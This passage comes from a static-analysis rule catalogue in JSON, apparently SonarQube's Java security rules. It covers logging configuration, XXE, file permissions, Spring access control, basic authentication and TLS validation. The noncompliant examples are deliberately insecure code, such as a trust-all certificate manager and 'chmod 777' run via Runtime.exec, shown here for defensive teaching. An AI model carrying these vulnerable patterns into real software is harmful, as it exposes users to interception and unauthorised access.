successful logins, server side input validation failures, access denials and any important transaction. </li>\n  <li> Monitor the logs for any suspicious activity. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>This rule supports the following libraries: Log4J, <code>java.util.logging</code> and Logback</p>\n<pre>\n// === Log4J 2 ===\nimport org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;\nimport org.apache.logging.log4j.Level;\nimport org.apache.logging.log4j.core.*;\nimport org.apache.logging.log4j.core.config.*;\n\n// Sensitive: creating a new custom configuration\nabstract class CustomConfigFactory extends ConfigurationFactory {\n    // ...\n}\n\nclass A {\n    void foo(Configuration config, LoggerContext context, java.util.Map&lt;String, Level&gt; levelMap,\n            Appender appender, java.io.InputStream stream, java.net.URI uri,\n            java.io.File file, java.net.URL url, String source, ClassLoader loader, Level level, Filter filter)\n            throws java.io.IOException {\n        // Creating a new custom configuration\n        ConfigurationBuilderFactory.newConfigurationBuilder();  // Sensitive\n\n        // Setting loggers level can result in writing sensitive information in production\n        Configurator.setAllLevels(\"com.example\", Level.DEBUG);  // Sensitive\n        Configurator.setLevel(\"com.example\", Level.DEBUG);  // Sensitive\n        Configurator.setLevel(levelMap);  // Sensitive\n        Configurator.setRootLevel(Level.DEBUG);  // Sensitive\n\n        config.addAppender(appender); // Sensitive: this modifies the configuration\n\n        LoggerConfig loggerConfig = config.getRootLogger();\n        loggerConfig.addAppender(appender, level, filter); // Sensitive\n        loggerConfig.setLevel(level); // Sensitive\n\n        context.setConfigLocation(uri); // Sensitive\n\n        // Load the configuration from a stream or file\n        new ConfigurationSource(stream);  // Sensitive\n        new ConfigurationSource(stream, file);  // Sensitive\n        new ConfigurationSource(stream, url);  // Sensitive\n        ConfigurationSource.fromResource(source, loader);  // Sensitive\n        ConfigurationSource.fromUri(uri);  // Sensitive\n    }\n}\n</pre>\n<pre>\n// === java.util.logging ===\nimport java.util.logging.*;\n\nclass M {\n    void foo(LogManager logManager, Logger logger, java.io.InputStream is, Handler handler)\n            throws SecurityException, java.io.IOException {\n        logManager.readConfiguration(is); // Sensitive\n\n        logger.setLevel(Level.FINEST); // Sensitive\n        logger.addHandler(handler); // Sensitive\n    }\n}\n</pre>\n<pre>\n// === Logback ===\nimport ch.qos.logback.classic.util.ContextInitializer;\nimport ch.qos.logback.core.Appender;\nimport ch.qos.logback.classic.joran.JoranConfigurator;\nimport ch.qos.logback.classic.spi.ILoggingEvent;\nimport ch.qos.logback.classic.*;\n\nclass M {\n    void foo(Logger logger, Appender&lt;ILoggingEvent&gt; fileAppender) {\n        System.setProperty(ContextInitializer.CONFIG_FILE_PROPERTY, \"config.xml\"); // Sensitive\n        JoranConfigurator configurator = new JoranConfigurator(); // Sensitive\n\n        logger.addAppender(fileAppender); // Sensitive\n        logger.setLevel(Level.DEBUG); // Sensitive\n    }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Log4J 1.x is not covered as it has reached <a href=\"https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces\">end of\nlife</a>.</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/117\">CWE-117 - Improper Output Neutralization for Logs</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/532\">CWE-532 - Information Exposure Through Log Files</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S2755": {
        "name": "XML parsers should not be vulnerable to XXE attacks",
        "htmlDesc": "<p>This vulnerability allows the usage of external entities in XML.</p>\n<h2>Why is this an issue?</h2>\n<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without\nproper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>\n<h3>What is the potential impact?</h3>\n<h4>Exposing sensitive data</h4>\n<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can\nreference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these\nentities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe\nthreat to the confidentiality of critical information.</p>\n<h4>Exhausting system resources</h4>\n<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,\nattackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading\nto system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>\n<h4>Forging requests</h4>\n<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker\ncan make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as\nretrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,\nincluding unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre>\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>Protection from XXE can be done in several different ways. Choose one depending on how the affected parser object is used in your code.</p>\n<p><strong>1.</strong> The first way is to completely disable <code>DOCTYPE</code> declarations:</p>\n<pre>\n// Applicable to:\n// - DocumentBuilderFactory\n// - SAXParserFactory\n// - SchemaFactory\nfactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n\n// For XMLInputFactory:\nfactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n</pre>\n<p><strong>2.</strong> Disable external entity declarations completely:</p>\n<pre>\n// Applicable to:\n// - DocumentBuilderFactory\n// - SAXParserFactory\nfactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\nfactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n\n// For XMLInputFactory:\nfactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, Boolean.FALSE);\n</pre>\n<p><strong>3.</strong> Prohibit the use of all protocols by external entities:</p>\n<pre>\n// `setAttribute` variant, applicable to:\n// - DocumentBuilderFactory\n// - TransformerFactory\nfactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\nfactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");\n\n// `setProperty` variant, applicable to:\n// - XMLInputFactory\n// - SchemaFactory\nfactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\nfactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");\n\n// For SAXParserFactory, the prohibition is done on child objects:\nSAXParser parser = factory.newSAXParser();\nparser.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\nparser.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");\n</pre>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h3>Going the extra mile</h3>\n<h4>Disable entity expansion</h4>\n<p>Specifically for <code>DocumentBuilderFactory</code>, it is possible to disable the entity expansion. Note, however, that this does not prevent the\nretrieval of external entities.</p>\n<pre>\nfactory.setExpandEntityReferences(false);\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "java:S2612": {
        "name": "Setting loose POSIX file permissions is security-sensitive",
        "htmlDesc": "<p>In Unix file system permissions, the \"<code>others</code>\" category refers to all users except the owner of the file system resource and the\nmembers of the group assigned to this resource.</p>\n<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive\ninformation, disrupt services or elevate privileges.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n    public void setPermissions(String filePath) {\n        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();\n        // user permission\n        perms.add(PosixFilePermission.OWNER_READ);\n        perms.add(PosixFilePermission.OWNER_WRITE);\n        perms.add(PosixFilePermission.OWNER_EXECUTE);\n        // group permissions\n        perms.add(PosixFilePermission.GROUP_READ);\n        perms.add(PosixFilePermission.GROUP_EXECUTE);\n        // others permissions\n        perms.add(PosixFilePermission.OTHERS_READ); // Sensitive\n        perms.add(PosixFilePermission.OTHERS_WRITE); // Sensitive\n        perms.add(PosixFilePermission.OTHERS_EXECUTE); // Sensitive\n\n        Files.setPosixFilePermissions(Paths.get(filePath), perms);\n    }\n</pre>\n<pre>\n    public void setPermissionsUsingRuntimeExec(String filePath) {\n        Runtime.getRuntime().exec(\"chmod 777 file.json\"); // Sensitive\n    }\n</pre>\n<pre>\n    public void setOthersPermissionsHardCoded(String filePath ) {\n        Files.setPosixFilePermissions(Paths.get(filePath), PosixFilePermissions.fromString(\"rwxrwxrwx\")); // Sensitive\n    }\n</pre>\n<h2>Compliant Solution</h2>\n<p>On operating systems that implement POSIX standard. This will throw a <code>UnsupportedOperationException</code> on Windows.</p>\n<pre>\n    public void setPermissionsSafe(String filePath) throws IOException {\n        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();\n        // user permission\n        perms.add(PosixFilePermission.OWNER_READ);\n        perms.add(PosixFilePermission.OWNER_WRITE);\n        perms.add(PosixFilePermission.OWNER_EXECUTE);\n        // group permissions\n        perms.add(PosixFilePermission.GROUP_READ);\n        perms.add(PosixFilePermission.GROUP_EXECUTE);\n        // others permissions removed\n        perms.remove(PosixFilePermission.OTHERS_READ); // Compliant\n        perms.remove(PosixFilePermission.OTHERS_WRITE); // Compliant\n        perms.remove(PosixFilePermission.OTHERS_EXECUTE); // Compliant\n\n        Files.setPosixFilePermissions(Paths.get(filePath), perms);\n    }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission\">OWASP File Permission</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.+Create+files+with+appropriate+access+permissions\">CERT, FIO01-J.</a> -\n  Create files with appropriate access permissions </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions\">CERT, FIO06-C.</a> - Create\n  files with appropriate access permissions </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S3752": {
        "name": "Allowing both safe and unsafe HTTP methods is security-sensitive",
        "htmlDesc": "<p>An HTTP method is safe when used to perform a read-only operation, such as retrieving information. In contrast, an unsafe HTTP method is used to\nchange the state of an application, for instance to update a user’s profile on a web application.</p>\n<p>Common safe HTTP methods are GET, HEAD, or OPTIONS.</p>\n<p>Common unsafe HTTP methods are POST, PUT and DELETE.</p>\n<p>Allowing both safe and unsafe HTTP methods to perform a specific operation on a web application could impact its security, for example CSRF\nprotections are most of the time only protecting operations performed by unsafe HTTP methods.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> HTTP methods are not defined at all for a route/controller of the application. </li>\n  <li> Safe HTTP methods are defined and used for a route/controller that can change the state of an application. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>For all the routes/controllers of an application, the authorized HTTP methods should be explicitly defined and safe HTTP methods should only be\nused to perform read-only operations.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n@RequestMapping(\"/delete_user\")  // Sensitive: by default all HTTP methods are allowed\npublic String delete1(String username) {\n// state of the application will be changed here\n}\n\n@RequestMapping(path = \"/delete_user\", method = {RequestMethod.GET, RequestMethod.POST}) // Sensitive: both safe and unsafe methods are allowed\nString delete2(@RequestParam(\"id\") String id) {\n// state of the application will be changed here\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@RequestMapping(\"/delete_user\", method = RequestMethod.POST)  // Compliant\npublic String delete1(String username) {\n// state of the application will be changed here\n}\n\n@RequestMapping(path = \"/delete_user\", method = RequestMethod.POST) // Compliant\nString delete2(@RequestParam(\"id\") String id) {\n// state of the application will be changed here\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/352\">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/csrf\">OWASP: Cross-Site Request Forgery</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-use-proper-verbs\">Spring Security Official\n  Documentation: Use proper HTTP verbs (CSRF protection)</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "java:S4601": {
        "name": "\"HttpSecurity\" URL patterns should be correctly ordered",
        "htmlDesc": "<p>Spring Framework, and, more precisely, the Spring Security component, allows setting up access control checks at the URI level. This is done by\nadding request matchers to the security configuration, each authorizing access to some resources depending on the incoming request entitlement.</p>\n<p>Similarly to firewall filtering rules, the order in which those matchers are defined is security relevant.</p>\n<h2>Why is this an issue?</h2>\n<p>Configured URL matchers are considered in the order they are declared. Especially, for a given resource, if a looser filter is defined before a\nstricter one, only the less secure configuration will apply. No request will ever reach the stricter rule.</p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> A URL pattern ending with <code>**</code> precedes another one having the same prefix. E.g. <code>/admin/**</code> is defined before\n  <code>/admin/example/**</code> </li>\n  <li> A pattern without wildcard characters is preceded by another one that matches it. E.g.: <code>/page-index/db</code> is defined after\n  <code>/page*/**</code> </li>\n</ul>\n<h3>What is the potential impact?</h3>\n<p>Access control rules that have been defined but cannot be applied generally indicate an error in the filtering process. In most cases, this will\nhave consequences on the application’s authorization and authentication mechanisms.</p>\n<h4>Authentication bypass</h4>\n<p>When the ignored access control rule is supposed to enforce the authentication on a resource, the consequence is a bypass of the authentication for\nthat resource. Depending on the scope of the ignored rule, a single feature or whole sections of the application can be left unprotected.</p>\n<p>Attackers could take advantage of such an issue to access the affected features without prior authentication, which may impact the confidentiality\nor integrity of sensitive, business, or personal data.</p>\n<h4>Privilege escalation</h4>\n<p>When the ignored access control rule is supposed to verify the role of an authenticated user, the consequence is a privilege escalation or\nauthorization bypass. An authenticated user with low privileges on the application will be able to access more critical features or sections of the\napplication.</p>\n<p>This could have financial consequences if the accessed features are normally accessed by paying users. It could also impact the confidentiality or\nintegrity of sensitive, business, or personal data, depending on the features.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable because it defines access control configuration in the wrong order.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .antMatchers(\"/resources/**\", \"/signup\", \"/about\").permitAll()\n      .antMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n      .antMatchers(\"/admin/login\").permitAll() // Noncompliant\n      .antMatchers(\"/**\", \"/home\").permitAll()\n      .antMatchers(\"/db/**\").access(\"hasRole('ADMIN') and hasRole('DBA')\") // Noncompliant\n      .and().formLogin().loginPage(\"/login\").permitAll().and().logout().permitAll();\n  }\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .antMatchers(\"/resources/**\", \"/signup\", \"/about\").permitAll()\n      .antMatchers(\"/admin/login\").permitAll()\n      .antMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n      .antMatchers(\"/db/**\").access(\"hasRole('ADMIN') and hasRole('DBA')\")\n      .antMatchers(\"/**\", \"/home\").permitAll()\n      .and().formLogin().loginPage(\"/login\").permitAll().and().logout().permitAll();\n  }\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Spring Documentation - <a href=\"https://docs.spring.io/spring-security/reference/servlet/authorization/authorize-http-requests.html\">Authorize\n  HttpServletRequests</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 - Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 - Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/285\">CWE-285 - Improper Authorization</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/287\">CWE-287 - Improper Authentication</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nString ip = \"192.168.12.42\"; // Sensitive\nSocket socket = new Socket(ip, 6667);\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString ip = System.getenv(\"IP_ADDRESS\"); // Compliant\nSocket socket = new Socket(ip, 6667);\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OjdGBQ\">CERT, MSC03-J.</a> - Never hard code sensitive information </li>\n</ul>",
        "severity": "MINOR"
      },
      "java:S2647": {
        "name": "Basic authentication should not be used",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Basic authentication is a vulnerable method of user authentication that should be avoided. It functions by transmitting a Base64 encoded username\nand password. As Base64 is easy to recognize and reverse, sensitive data may be leaked this way.</p>\n<h2>Why is this an issue?</h2>\n<p>Basic authentication is a simple and widely used method of user authentication for HTTP requests. When a client sends a request to a server that\nrequires authentication, the client includes the username and password (concatenated together and Base64 encoded) in the \"Authorization\" header of the\nHTTP request. The server verifies the credentials and grants access if they are valid. Every request sent to the server to a protected endpoint must\ninclude these credentials.</p>\n<p>Basic authentication is considered insecure for several reasons:</p>\n<ul>\n  <li> It transmits user credentials in plain text, making them susceptible to interception and eavesdropping. </li>\n  <li> It relies solely on the server’s ability to verify the provided credentials. There is no mechanism for additional security measures like\n  multi-factor authentication or account lockouts after multiple failed login attempts. </li>\n  <li> It does not provide a way to manage user sessions securely. The client typically includes the credentials in every request, which creates more\n  opportunities for an attacker to steal these credentials. </li>\n</ul>\n<p>These security limitations make basic authentication an insecure choice for authentication or authorization over HTTP.</p>\n<h3>What is the potential impact?</h3>\n<p>Basic authentication transmits passwords in plain text, which makes it vulnerable to interception by attackers.</p>\n<h4>Session hijacking and man-in-the-middle attack</h4>\n<p>If an attacker gains access to the network traffic, they can easily capture the username and password. Basic authentication does not provide any\nmechanism to protect against session hijacking attacks. Once a user is authenticated, the session identifier (the username and password) is sent in\nclear text with each subsequent request. If attackers can intercept one request, they can use it to impersonate the authenticated user, gaining\nunauthorized access to their account and potentially performing malicious actions.</p>\n<h4>Brute-force attacks</h4>\n<p>Basic authentication does not have any built-in protection against brute-force attacks. Attackers can repeatedly guess passwords until they find\nthe correct one, especially if weak or commonly used passwords are used. This can lead to unauthorized access to user accounts and potential data\nbreaches.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code uses basic authentication to send out an HTTP request to a protected endpoint.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\nString encoded = Base64.getEncoder().encodeToString(\"login:passwd\".getBytes());\nHttpURLConnection conn = (HttpURLConnection) url.openConnection();\nconn.setRequestMethod(\"POST\");\nconn.setDoOutput(true);\nconn.setRequestProperty(\"Authorization\", \"Basic \" + encoded); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\n// An access token should be retrieved before the HTTP request\nString accessToken = System.getenv(\"ACCESS_TOKEN\");\nHttpURLConnection conn = (HttpURLConnection) url.openConnection();\nconn.setRequestMethod(\"POST\");\nconn.setDoOutput(true);\nconn.setRequestProperty(\"Authorization\", \"Bearer \" + accessToken);\n</pre>\n<h3>How does this work?</h3>\n<h4>Token-based authentication and OAuth</h4>\n<p>Token-based authentication is a safer alternative than basic authentication. A unique token is generated upon successful authentication and sent to\nthe client, which is then included in subsequent requests. Therefore, it eliminates the need to transmit sensitive credentials with each request.\nOAuth also works by authenticating users via tokens. It gives even more flexibility on top of this by offering scopes, which limit an application’s\naccess to a user’s account.</p>\n<p>Additionally, both token-based authentication and OAuth support mechanisms for token expiration, revocation, and refresh. This gives more\nflexibility than basic authentication, as compromised tokens carry much less risk than a compromised password.</p>\n<h4>SSL encryption for HTTP requests</h4>\n<p>With basic authentication, user credentials are transmitted in plain text, which makes them vulnerable to interception and eavesdropping. However,\nwhen HTTPS is employed, the data is encrypted before transmission, making it significantly more difficult for attackers to intercept and decipher the\ncredentials. If no other form of authentication is possible for this code, then every request must be sent over HTTPS to ensure credentials are kept\nsafe.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> MDN web docs - <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication\">HTTP authentication</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication\">OWASP Web Service Security\n  Cheat Sheet</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/522\">CWE-522 - Insufficiently Protected Credentials</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled certificate validation.</p>\n<p>The certificate validation gets disabled by overriding <code>X509TrustManager</code> with an empty implementation. It is highly recommended to use\nthe original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre>\nclass TrustAllManager implements X509TrustManager {\n\n    @Override\n    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {  // Noncompliant\n    }\n\n    @Override\n    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException { // Noncompliant\n    }\n\n    @Override\n    public X509Certificate[] getAcceptedIssuers() {\n        return null;\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the 